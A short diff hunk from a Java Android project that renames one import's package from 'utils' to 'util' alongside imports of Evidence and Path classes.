@@ -20,7 +20,7 @@ import android.util.Log;
 
 import com.ht.RCSAndroidGUI.evidence.Evidence;
 import com.ht.RCSAndroidGUI.file.Path;
-import com.ht.RCSAndroidGUI.utils.Check;
+import com.ht.RCSAndroidGUI.util.Check;
 
 // TODO: Auto-generated Javadoc
 /**
